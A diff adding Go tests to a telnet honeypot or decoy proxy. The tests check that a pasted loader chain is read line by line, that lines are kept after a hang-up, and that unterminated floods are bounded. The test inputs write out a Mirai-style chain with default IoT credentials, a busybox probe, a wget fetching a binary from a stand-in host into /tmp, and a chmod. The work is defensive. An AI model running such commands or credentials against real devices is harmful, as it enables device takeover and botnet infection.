@@ -369,3 +369,70 @@ func awaitTelnet(t *testing.T, s *proxy.Server, ok func(proxy.Snapshot) bool, wh
 	sn := s.Stats()
 	t.Fatalf("%s: deceived %d, tripped %d", what, sn.TelnetDeceived, sn.TelnetTripwire)
 }
+
+// A payload is pasted, not typed: the loader writes its whole chain in one go and
+// hangs up. Every line of it is the intelligence, so the fabrication has to read
+// them all -- a reader that kept only what arrived before the first terminator
+// would collect the first line and lose the one that names the payload.
+func TestAPastedPayloadIsReadLineByLine(t *testing.T) {
+	s := proxytest.Start(t, decoyTelnetYAML)
+	c := dial(t, s.Addrs()["legacy"])
+	c.readUntil("login: ")
+	// The whole exchange in one write: two logins, because the trap takes two
+	// credentials, and then the chain.
+	c.write([]byte("root\r\nxc3511\r\nadmin\r\n1234\r\n" +
+		"/bin/busybox MIRAI\r\n" +
+		"wget http://198.51.100.9/bins/x.arm7 -O /tmp/x\r\n" +
+		"chmod +x /tmp/x\r\n"))
+	// The last line of the chain is answered, which means every line before it
+	// was read as its own command.
+	got := c.readUntil("chmod")
+	if !strings.Contains(got, "applet not found") {
+		t.Errorf("the busybox probe was not answered: %q", got)
+	}
+	if !strings.Contains(got, "connect") {
+		t.Errorf("the fetch was not answered: %q", got)
+	}
+	awaitTelnet(t, s, func(sn proxy.Snapshot) bool { return sn.TelnetTripwire >= 2 },
+		"the pasted chain did not trip the wire twice")
+}
+
+// The loader's actual shape: it writes the whole chain and hangs up without
+// waiting to be answered. What it wrote is still there to be read, so the lines
+// after the one that was being read when the connection went are still collected.
+func TestAPastedPayloadIsReadAfterTheClientHangsUp(t *testing.T) {
+	s := proxytest.Start(t, decoyTelnetYAML)
+	c := dial(t, s.Addrs()["legacy"])
+	c.readUntil("login: ")
+	c.write([]byte("root\r\nxc3511\r\nadmin\r\n1234\r\n" +
+		"wget http://198.51.100.9/bins/x.arm7 -O /tmp/x\r\n" +
+		"chmod +x /tmp/x\r\n"))
+	if err := c.c.(interface{ CloseWrite() error }).CloseWrite(); err != nil {
+		t.Fatal(err)
+	}
+	// Two tripwires: the fetch and the chmod. Both were written before the
+	// client stopped listening, and both are in the record.
+	awaitTelnet(t, s, func(sn proxy.Snapshot) bool { return sn.TelnetTripwire >= 2 },
+		"the lines written before the hang-up were lost")
+}
+
+// A client that types a great deal with no line terminator in it is filling
+// memory rather than typing, and the answer is bounded rather than held. The
+// bound is maxPromptLine (256), which is what a name or a code is.
+func TestAnAnswerWithNoLineIsBounded(t *testing.T) {
+	s := proxytest.Start(t, decoyTelnetYAML)
+	c := dial(t, s.Addrs()["legacy"])
+	c.readUntil("login: ")
+	c.write([]byte(strings.Repeat("a", 64*1024)))
+	// The session ends rather than growing a 64 KiB name.
+	buf := make([]byte, 1)
+	_ = c.c.SetReadDeadline(time.Now().Add(10 * time.Second))
+	for {
+		if _, err := c.c.Read(buf); err != nil {
+			break
+		}
+	}
+	if n := s.Stats().Refusals["telnet"]["prompt"]; n < 1 {
+		t.Errorf("the flood was not refused: %+v", s.Stats().Refusals["telnet"])
+	}
+}
